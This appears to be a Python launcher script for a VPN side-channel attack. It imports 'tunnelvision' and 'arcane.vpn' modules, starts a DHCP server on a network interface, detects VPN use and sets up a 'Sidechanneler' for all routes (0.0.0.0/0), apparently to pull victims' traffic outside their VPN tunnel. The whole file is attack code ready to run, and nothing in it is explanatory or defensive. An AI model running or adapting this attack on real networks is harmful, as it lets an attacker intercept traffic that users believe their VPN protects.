#!/usr/bin/env python3
from arcane.vpn.sidechanneler import Sidechanneler
from tunnelvision import allowlist_events, build_dhcp_from_args, ALLOWED_EVENTS
from arcane.core.events import VPNDetectorEvent
from arcane.vpn.detector import VPNDetector

def main():
    ALLOWED_EVENTS.append(VPNDetectorEvent.VPN_FOUND)
    allowlist_events()
    interface, server, _lease_gen, _kwargs = build_dhcp_from_args()

    vpn_detector = VPNDetector(interface)

    #input("Press enter to start SIDE CHANNEL")
    side_channeler = Sidechanneler(server, "0.0.0.0/0")
    interface.thread.join()


if __name__ == "__main__":
    main()
